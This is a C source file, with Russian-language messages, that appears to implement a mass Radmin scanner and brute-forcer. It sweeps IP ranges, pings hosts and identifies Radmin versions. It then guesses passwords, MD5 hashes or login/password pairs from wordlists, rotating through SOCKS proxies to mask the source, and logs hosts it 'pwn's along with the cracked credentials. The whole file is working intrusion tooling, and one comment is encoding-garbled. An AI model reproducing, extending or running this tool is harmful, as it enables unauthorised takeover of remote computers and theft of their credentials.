/* -------------------------------------------------------------------------- */

#include "scan.h"

/* -------------------------------------------------------------------------- */

void scan_puts(LSCANCX *cx, char *text)
{
	if(mutexlock(cx->printlock))
	{
		puts(text);
		mutexrelease(cx->printlock);
	}
}

/* -------------------------------------------------------------------------- */

void scan_logputs(LSCANCX *cx, char *text)
{
	if(mutexlock(cx->loglock))
	{
		fputs(text, cx->logstream);
		fflush(cx->logstream);
		mutexrelease(cx->loglock);
	}
}

/* -------------------------------------------------------------------------- */

void scan_log_host(LSCANCX *cx, char *state, unsigned long host, int port,
	char *rtt, char *version, char *auth, char *username, char *password)
{
	char hosttext[20];
	char message[1024];
	sprintf(message, "%s\t%s\t%d\t%s\t%s\t%s\t%s\t%s\n",
		state, iptext(hosttext, host), port, rtt, version, auth, username, password);
	scan_logputs(cx, message);
}

/* -------------------------------------------------------------------------- */

void scan_select_proxy(LSCANCX *cx, tcp_open_struc *open)
{
	open->proxy_type = 0;

	if(cx->conf->proxies.length > 0)
	{
		PROXY *proxy = cx->conf->proxies.items[rand() % cx->conf->proxies.length];
		open->proxy_type = cx->conf->socks;
		open->proxy_host = proxy->host;
		open->proxy_port = proxy->port;
		open->proxy_username = proxy->username;
		open->proxy_password = proxy->password;
	}
}

/* -------------------------------------------------------------------------- */

int scan_check_md5(char *str)
{
	int i;
	
	if(strlen(str) != 32)
	{
		return 0;
	}
	
	for(i = 0; i < 32; ++i)
	{
		if( ((str[i] < '0') || (str[i] > '9')) &&
			((str[i] < 'A') || (str[i] > 'F')) &&
			((str[i] < 'a') || (str[i] > 'f')) )
		{
			return 0;
		}
	}
	return 1;
}

/* -------------------------------------------------------------------------- */

void scan_radmin2(LSCANCX *cx, int rank, char *rtt, 
	char *hosttext, char *version, tcp_open_struc *host)
{
	char message[1024];
	int pass;
	char *password;
	int is_hash;
	int status;
	int errorcount;

	sprintf(message, "[*] Тред %d: %s: Обнаружен радмин %s",
		rank, hosttext, version);
	scan_puts(cx, message);

	if(cx->conf->passwords.length == 0)
	{
		sprintf(message, "[!] Тред %d: %s: радмин %s: Не заданы пароли для подбора",
			rank, hosttext, version);
		scan_puts(cx, message);
		scan_log_host(cx, "skipped", host->host, host->port, 
			rtt, version, "pass", "", "");
		return;
	}

	/* пробуем пароли */
	status = RADMIN_STATUS_PASSERR;
	pass = 0;
	errorcount = 0;
	while(pass < cx->conf->passwords.length)
	{
		password = cx->conf->passwords.items[pass];

		/* пароль или хэш? */
		is_hash = cx->conf->usehash && scan_check_md5(password);

		/* подходит ли по длине? */
		if( (strlen(password) >= RADMIN2_MIN_PASSLEN) ||
			(is_hash) )
		{
			/* выводим статус */
			sprintf(message, "[*] Тред %d: %s: радмин %s: Пробуем %s %s (%d%%, попытка %d)",
				rank, hosttext, version, is_hash ? "хэш" : "пароль", password,
				pass*100 / cx->conf->passwords.length, errorcount+1);
			scan_puts(cx, message);

			/* пробуем */
			scan_select_proxy(cx, host);
			status = radmin_auth2(host, password, cx->conf->iotimeout, is_hash);

			/* успешно */
			if(status == RADMIN_STATUS_SUCCESS)
			{
				break;
			}

			/* неверный пароль */
			else if(status == RADMIN_STATUS_PASSERR)
			{
				pass++;
				errorcount = 0;
				Sleep(cx->conf->delay);
			}

			/* другая ошибка */
			else
			{
				if(errorcount == cx->conf->retrycount)
					break;
				errorcount++;
				Sleep(cx->conf->faildelay * 1000);
			}
		}

		/* пароль не подходит */
		else
		{
			pass++;
		}
	}

	/* успешно */
	if(status == RADMIN_STATUS_SUCCESS)
	{
		sprintf(message, "[*] Тред %d: %s: радмин %s: Подобран %s %s",
			rank, hosttext, version, is_hash ? "хэш" : "пароль", password);
		scan_puts(cx, message);
		scan_log_host(cx, "pwn", host->host, host->port, rtt, version, 
			is_hash ? "hash" : "pass", "", password);
	}

	/* ошибка */
	else
	{
		char *errname;
		char *errshort;

		switch(status)
		{
		case RADMIN_STATUS_ERROR:
			errname = "Сбой соединения";
			errshort = "connection_failed";
			break;
		case RADMIN_STATUS_PROTOERR:
			errname = "Неверный отклик сервера";
			errshort = "sequence_failed";
			break;
		case RADMIN_STATUS_PASSERR:
			errname = "Пароль не подобран";
			errshort = "pass_notfound";
			break;
		default:
			errname = "Какая-то там ошибка";
			errshort = "unknown_error";
			break;
		}
		
		sprintf(message, "[!] Тред %d: %s: радмин %s: %s",
			rank, hosttext, version, errname);
		scan_puts(cx, message);
		
		if(cx->conf->all)
		{
			scan_log_host(cx, "fail", host->host, host->port, rtt, version, 
				errshort, "", "");
		}
	}
}

/* -------------------------------------------------------------------------- */

void scan_radmin3(LSCANCX *cx, int rank, char *rtt, 
	char *hosttext, char *version, tcp_open_struc *host)
{
	char message[1024];
	int status;
	int name;
	int pass;
	char *username;
	char *password;
	int is_hash;
	int errorcount;
	int total, current;
	char *lastvalidlogin;

	sprintf(message, "[*] Тред %d: %s: Обнаружен радмин %s",
		rank, hosttext, version);
	scan_puts(cx, message);

	if(cx->conf->usernames.length == 0)
	{
		sprintf(message, "[!] Тред %d: %s: радмин %s: Не заданы логины для подбора",
			rank, hosttext, version);
		scan_puts(cx, message);
		scan_log_host(cx, "skipped", host->host, host->port, 
			rtt, version, "login_pass", "", "");
		return;
	}

	if(cx->conf->passwords.length == 0)
	{
		sprintf(message, "[!] Тред %d: %s: радмин %s: Не заданы пароли для подбора",
			rank, hosttext, version);
		scan_puts(cx, message);
		scan_log_host(cx, "skipped", host->host, host->port, 
			rtt, version, "login_pass", "", "");
		return;
	}

	/* пробуем логины */
	status = RADMIN_STATUS_PASSERR;
	total = cx->conf->usernames.length * 
		cx->conf->passwords.length;
	current = 0;
	lastvalidlogin = "";
	for(name = 0; name < cx->conf->usernames.length; ++name)
	{
		username = cx->conf->usernames.items[name];

		/* пробуем пароли */
		pass = 0;
		errorcount = 0;
		while(pass < cx->conf->passwords.length)
		{
			password = cx->conf->passwords.items[pass];

			/* хэш или пароль? */
			is_hash = cx->conf->usehash && scan_check_md5(password);

			/* пароль подходит */
			if( (!is_hash) && (strlen(password) >= RADMIN3_MIN_PASSLEN) )
			{
				/* выводим статус */
				sprintf(message, "[*] Тред %d: %s: радмин %s: Пробуем логин %s и пароль %s (%d%%, попытка %d)",
					rank, hosttext, version, username, password,
					(current+pass)*100/total, errorcount+1);
				scan_puts(cx, message);

				/* пробуем */
				scan_select_proxy(cx, host);
				status = radmin_auth3(host, username, password, cx->conf->iotimeout);

				/* пароль подобран или логин не подходит, выходим из цикла */
				if( (status == RADMIN_STATUS_SUCCESS) ||
					(status == RADMIN_STATUS_NAMEERR) )
				{
					break;
				}

				/* пароль не подходит */
				else if(status == RADMIN_STATUS_PASSERR)
				{
					lastvalidlogin = username;
					pass++;
					Sleep(cx->conf->delay);
					errorcount = 0;
				}

				/* другая ошибка */
				else
				{
					if(errorcount == cx->conf->retrycount)
						break;
					errorcount++;
					Sleep(cx->conf->faildelay * 1000);
				}
			}

			/* такой пароль не нужен */
			else
			{
				pass++;
			}		
		}

		/* перебор закончен */
		if( (status != RADMIN_STATUS_PASSERR) &&
			(status != RADMIN_STATUS_NAMEERR) )
		{
			break;
		}

		Sleep(cx->conf->delay);
		
		current += cx->conf->passwords.length;
	}

	/* успешно */
	if(status == RADMIN_STATUS_SUCCESS)
	{
		sprintf(message, "[*] Тред %d: %s: радмин %s: Подобран логин %s и пароль %s",
			rank, hosttext, version, username, password);
		scan_puts(cx, message);
		scan_log_host(cx, "pwn", host->host, host->port, rtt, version, 
			"login_pass", username, password);
	}

	/* ошибка */
	else
	{
		char *errname;
		char *errshort;
		switch(status)
		{
		case RADMIN_STATUS_ERROR:
			errname = "Сбой соединения";
			errshort = "connection_failed";
			break;
		case RADMIN_STATUS_PROTOERR:
			errname = "Неверный отклик сервера";
			errshort = "sequence_failed";
			break;
		case RADMIN_STATUS_PASSERR:
			errname = "Пароль не подобран";
			errshort = "pass_notfound";
			break;
		case RADMIN_STATUS_NAMEERR:
			errname = "Логин не подобран";
			errshort = "login_notfound";
			break;
		case RADMIN_STATUS_ALGOERR:
			errname = "Сбой в рассчётах";
			errshort = "algorithm_failure";
			break;
		default:
			errname = "Какая-то там ошибка";
			errshort = "unknown_error";
			break;
		}

		sprintf(message, "[!] Тред %d: %s: радмин %s: %s",
			rank, hosttext, version, errname);
		scan_puts(cx, message);
		
		if(cx->conf->all)
		{
			scan_log_host(cx, "fail", host->host, host->port, rtt, version, 
				errshort, lastvalidlogin, "");
		}
	}
}

/* -------------------------------------------------------------------------- */

void scan_host(LSCANCX *cx, int rank, char *rtt, unsigned long host, int port)
{
	char message[256];
	char hosttext[32];
	char temp[20];
	char *version;
	int auth;
	tcp_open_struc open;

	/* выводим хост и порт */
	sprintf(hosttext, "%s:%d", iptext(temp, host), port);
	sprintf(message, "[*] Тред %d: Пробую соединиться с %s",
		rank, hosttext);
	scan_puts(cx, message);

	/* пробуем соединиться */
	open.host = host;
	open.port = port;

	scan_select_proxy(cx, &open);
	if(!radmin_check_version(&open, &version, &auth, cx->conf->iotimeout))
		return;

	/* нет пароля */
	if( (auth == RADMIN_AUTH_NONE_2) ||
		(auth == RADMIN_AUTH_NONE_3) )
	{
		sprintf(message, "[*] Тред %d: %s: Нет пароля",
			rank, hosttext);
		scan_puts(cx, message);
		scan_log_host(cx, "pwn", host, port, rtt, version, "nopass", "", "");
	}

	/* радмин 2 */
	else if(auth == RADMIN_AUTH_NATIVE_2)
	{
		scan_radmin2(cx, rank, rtt, hosttext, version, &open);
	}

	/* радмин 3 */
	else if(auth == RADMIN_AUTH_NATIVE_3)
	{
		scan_radmin3(cx, rank, rtt, hosttext, version, &open);
	}

	/* неизвестно */
	else if(auth == RADMIN_AUTH_UNKNOWN)
	{
		sprintf(message, "[!] Тред %d: %s: Неизвестный тип авторизации",
			rank, hosttext);
		scan_puts(cx, message);
		if(cx->conf->all)
		{
			scan_log_host(cx, "fail", host, port, rtt, version, "unknown", "", "");
		}
	}

	/* не поддерживается */
	else
	{
		sprintf(message, "[!] Тред %d: %s: Тип авторизации не поддерживается",
			rank, hosttext);
		scan_puts(cx, message);
		if(cx->conf->all)
		{
			scan_log_host(cx, "fail", host, port, rtt, version, "unsupported", "", "");
		}
	}
}

/* -------------------------------------------------------------------------- */

void scan_thread(LSCANCX *cx)
{
	char message[256];
	char hosttext[32];
	char rtttext[10];
	int rank;
	time_t t;

	/* чршэшЄшь Ёрэфюь */
	time(&t);
	srand((unsigned int)t);

	if(cx)
	{
		int enabled;

		if(!mutexlock(cx->lock))
			return;
		rank = cx->regthreads++;
		mutexrelease(cx->lock);

		Sleep(100);

		do //enabled
		{
			int alive;
			unsigned long host;
			
			enabled = 0;
			
			/* выбираем хост */
			if(mutexlock(cx->lock))
			{
				if((enabled = cx->morehosts))
				{
					HOSTRANGE *hr;

					/* берём текущий хост */
					host = cx->curhost;

					/* делаем следующий хост текущим */
					hr = cx->conf->hosts.items[cx->currange];
					if(cx->curhost == hr->end)
					{
						if(cx->currange == (cx->conf->hosts.length-1))
						{
							cx->morehosts = 0;
						}
						else
						{
							cx->currange++;
							hr = cx->conf->hosts.items[cx->currange];
							cx->curhost = hr->start;
						}
					}
					else
					{
						cx->curhost++;
					}
				}

				mutexrelease(cx->lock);
			}

			/* работаем с хостом */
			if(enabled)
			{
				iptext(hosttext, host);
			}

			/* пингуем хост */
			alive = 1;
			strcpy(rtttext, "N/A");
			if(enabled && (!cx->conf->noping) )
			{
				int err;
				int temp;
				int rtt;
				
				temp = cx->conf->timeout / 10;
				rtt = cx->conf->timeout - temp/2 + 
					rand() % temp;

				alive = 0;

				if(semaphorelock(cx->pinglock))
				{
					sprintf(message,
						"[*] Тред %d: Пингую %s",
						rank, hosttext);
					scan_puts(cx, message);

					alive = ping(host, &rtt, 
						&err, cx->conf->packets);
				
					if(err)
					{
						sprintf(message, 
							"[!] Тред %d: Ошибка пинговки %s",
							rank, hosttext);
						scan_puts(cx, message);
						strcpy(rtttext, "Error");
					}

					else if(alive)
					{
						sprintf(message, 
							"[*] Тред %d: Получен отклик от %s, время отклика %d мс",
							rank, hosttext, rtt);
						scan_puts(cx, message);
						sprintf(rtttext, "%d", rtt);
					}

					else
					{
						sprintf(rtttext, "Down");
					}
					
					semaphorerelease(cx->pinglock);
				}
			}

			/* сканируем */
			if(alive && enabled)
			{
				int curpr;

				/* проходим по списку портов */
				for(curpr = 0; curpr < cx->conf->ports.length; ++curpr)
				{
					PORTRANGE *pr = cx->conf->ports.items[curpr];
					int port;
					for(port = pr->start; port <= pr->end; ++port)
					{
						/* сканируем хост:порт */
						scan_host(cx, rank, rtttext, host, port);
					}
				}
			}
		
		} while(enabled);

		if(mutexlock(cx->lock))
		{
			cx->regthreads--;
			mutexrelease(cx->lock);
		}
	}
}

/* -------------------------------------------------------------------------- */

int scan_init(LSCANCX *cx, LSCANCONF *conf)
{
	if( cx && conf )
	{
		if(conf->hosts.length > 0)
		{
			cx->lock = mutexnew();
			cx->printlock = mutexnew();
			cx->loglock = mutexnew();
			cx->pinglock = semaphorenew(conf->maxhosts);
			if( (cx->lock) &&
				(cx->printlock) &&
				(cx->loglock) )
			{
				if((cx->logstream = fopen(conf->output, "at")))
				{
					cx->conf = conf;
					cx->regthreads = 0;
					cx->currange = 0;
					cx->morehosts = 1;
					cx->curhost = ((HOSTRANGE*)(conf->hosts.
						items[cx->currange]))->start;
					return 1;
				}
				else
				{
					printf("[-] Не удаётся открыть \"%s\"\n", 
						conf->output);
				}
			}
			mutexfree(cx->lock);
			mutexfree(cx->printlock);
			mutexfree(cx->loglock);
			semaphorefree(cx->pinglock);
		}
	}
	return 0;
}

/* -------------------------------------------------------------------------- */

void scan_free(LSCANCX *cx)
{
	if(cx)
	{
		mutexfree(cx->lock);
		mutexfree(cx->printlock);
		mutexfree(cx->loglock);
		semaphorefree(cx->pinglock);
		fclose(cx->logstream);
	}
}

/* -------------------------------------------------------------------------- */

void scan(LSCANCONF *conf)
{
	LSCANCX cx;
	if(scan_init(&cx, conf))
	{
		int i;
		puts("[*] Начинаю сканировать");
		puts("");
		for(i = 0; i < conf->count; ++i)
			threadstart(scan_thread, &cx);
		do {
			Sleep(100);
		} while(cx.regthreads > 0);
		scan_free(&cx);
		puts("");
		puts("[*] Cканирование завершено");
		puts("");
	}
}

/* -------------------------------------------------------------------------- */
